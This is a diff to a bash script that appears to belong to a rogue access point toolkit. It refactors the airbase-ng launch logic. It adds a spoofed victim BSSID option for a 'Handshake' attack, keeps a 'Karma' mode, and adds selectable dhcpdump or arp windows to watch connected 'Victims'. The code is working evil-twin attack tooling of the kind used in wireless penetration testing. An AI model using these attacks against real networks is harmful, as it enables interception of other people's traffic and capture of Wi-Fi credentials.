@@ -79,8 +79,10 @@ depends()
     get_name "BRIDGED="; BRIDGED=$USE
     get_name "BRIDGE_NAME="; BRIDGE_NAME=$USE
     get_name "ATTACK="; ATTACK=$USE
+    get_name "VICTIM_BSSID="; VICTIM_BSSID=$USE
     get_name "TYPE="; TYPE=$USE
     get_name "ENCRYPTION="; ENCRYPTION=$USE
+    get_name "MONITOR_MODE="; MONITOR_MODE=$USE
     AP_GATEWAY=$(grep routers $DIR/dhcpd.conf | awk -Frouters '{print $2}' | cut -d ';' -f 1 | cut -d ' ' -f 2)
     AP_SUBNET=$(grep netmask $DIR/dhcpd.conf | awk -Fnetmask '{print $2}' | cut -d '{' -f 1 | cut -d ' ' -f 2 | cut -d ' ' -f 1)
     AP_IP=$(grep netmask $DIR/dhcpd.conf | awk -Fnetmask '{print $1}' | cut -d ' ' -f 1)
@@ -111,8 +113,6 @@ setupenv()
     # Checked for orphaned processes then sanitize them
     if [[ -n $(ps -A | grep -i airbase) ]]; then echo "$WARN Leftover scoobie snacks found! nom nom"; killall airbase-ng; fi
     
-    if [[ -n $(ip addr | grep -i "$MON") ]]; then echo "$WARN Leftover scoobie snacks found! nom nom"; airmon-zc stop $MON; fi
-
     if [[ -e /etc/init.d/net.$AP ]]; then
         get_RCstatus "$AP"
         if [[ $STATUS == 'started' ]]; then
@@ -123,7 +123,7 @@ setupenv()
     sessionfolder=/tmp/n4p # Set our tmp working configuration directory and then build config files
     if [ ! -d "$sessionfolder" ]; then mkdir "$sessionfolder"; fi
         mkdir -p "$sessionfolder" "$sessionfolder/logs"
-    if [[ -n $(rfkill list | grep yes) ]]; then # If you think of a better way to do this then let me know
+    if [[ -n $(rfkill list | grep yes) ]]; then # If you think of a better way to do this than let me know
         rfkill unblock 0
     fi
 }
@@ -135,9 +135,10 @@ settings()
         get_RCstatus "$IFACE1"
         [[ $STATUS == 'started' ]] && /etc/init.d/net.$IFACE1 stop
     fi
-    get_state $IFACE1
-    [[ $STATE != 'DOWN' ]] && ip link set $IFACE1 down
-    iwconfig $IFACE1 mode managed # Force managed mode upon wlan because airmon wont do this
+
+    if [[ -z $(ip addr | grep -i "$MON") ]]; then 
+        iwconfig $IFACE1 mode managed # Force managed mode upon wlan because airmon wont do this
+    fi
 }
 
 keepalive()
@@ -187,29 +188,24 @@ trap killemAll INT HUP;
 ##################################################################
 startairbase()
 {
-    get_state "$IFACE1"
-    while [[ $STATE != 'DOWN' ]]; do 
-        ip link set "$IFACE1" down
-    done
-
-    echo -n "$INFO Airmon-zc comming up"
-    airmon-zc check kill
-    sleep 0.5
-    airmon-zc start $IFACE1
+    if [[ -z $(ip addr | grep -i "$MON") ]]; then 
+        echo -n "$INFO Airmon-zc comming up"
+        airmon-zc check kill
+        sleep 0.5
+        airmon-zc start $IFACE1 
+    fi
+    
 
     if [[ $MENUCHOICE == 1 ]]; then
         echo -n "$INFO STARTING SERVICE: AIRBASE-NG"
         if [[ $ATTACK == "Handshake" ]]; then
-            airbase-ng -$TYPE $ENCRYPTION -c $CHAN -x $PPS -I $BEACON -e $ESSID -P -v $MON > $sessionfolder/logs/airbase-ng.log &
-            sleep 1.5
+            airbase-ng -$TYPE $ENCRYPTION -c $CHAN -a $VICTIM_BSSID -e $ESSID -v $MON > $sessionfolder/logs/airbase-ng.log &
         elif [[ $ATTACK == "Karma" ]]; then # used elif instead of just else for more comprehensive structure so users may modify easier.
             airbase-ng -c $CHAN -x $PPS -I $BEACON -e $ESSID -P -C 15 -v $MON > $sessionfolder/logs/airbase-ng.log &
-            sleep 1.5
-        else # This just gives us an AP, useful for Sniffing
+        else # This just gives us an AP for Sniffing
             airbase-ng -c $CHAN -x $PPS -I $BEACON -e $ESSID -P -v $MON > $sessionfolder/logs/airbase-ng.log &
-            sleep 1.5
         fi
-    
+        sleep 1.5
     fi
 
     echo -ne "\n$INFO Assigning IP and Route to $AP\n"
@@ -246,10 +242,15 @@ startairbase()
 
 monitor()
 {
-    xterm -hold -geometry 60x35 -bg black -fg blue -T "N4P Victims" -e $DIR/./monitor.sh $1 &>/dev/null &
-    # Uncomment following lines to use different monitoring options that best suit you.
-    #xterm -hold -bg black -fg blue -T "N4P Victims" -geometry 65x15 -e dhcpdump -i $1 &>/dev/null &
-    #xterm -hold -bg black -fg blue -T "N4P Victims" -geometry 65x15 -e arp -a -i $1 &>/dev/null &
+    if [[ -n $MONITOR_MODE ]]; then
+        if [[ $MONITOR_MODE == "Custom" ]]; then
+            xterm -hold -geometry 60x35 -bg black -fg blue -T "N4P Victims" -e $DIR/./monitor.sh $1 &>/dev/null &
+        elif [[ $MONITOR_MODE == "dhcpdump" ]]; then
+            xterm -hold -bg black -fg blue -T "N4P Victims" -geometry 65x15 -e dhcpdump -i $1 &>/dev/null &
+        elif [[ $MONITOR_MODE == "arp" ]]; then
+            xterm -hold -bg black -fg blue -T "N4P Victims" -geometry 65x15 -e arp -a -i $1 &>/dev/null &
+        fi
+    fi
 }
 
 fhostapd()
@@ -293,9 +294,7 @@ openrc_bridge()
     [[ -n $INET ]] && ip addr del $CHK_IP dev $RESP_BR_2
 
     echo -ne "\n Building $BRIDGE now with $BRIDGE $RESP_BR_2 $BRIDGE_RESP_BR_1"
-    if [[ $UAP == "HOSTAPD" ]]; then
-        action iw dev $RESP_BR_2 set 4addr on; next
-    fi
+    [[ $UAP == "HOSTAPD" ]] && action iw dev $RESP_BR_2 set 4addr on; next
 
     get_state "$RESP_BR_2"
     while [[ $STATE == 'DOWN' || -z $(ip addr list | grep $RESP_BR_2) ]]; do 
@@ -362,10 +361,10 @@ menu()
         MENUCHOICE=2
     else
         echo "${BLD_ORA}
-        +===================================+
-        | 1) Airbase-NG NO KARMA            |
-        | 2) Hostapd
-        +===================================+${TXT_RST}"
+        +==================+
+        | 1) Airbase-NG    |
+        | 2) Hostapd       |
+        +==================+${TXT_RST}"
         read -e -p "Option: " MENUCHOICE
     fi
     
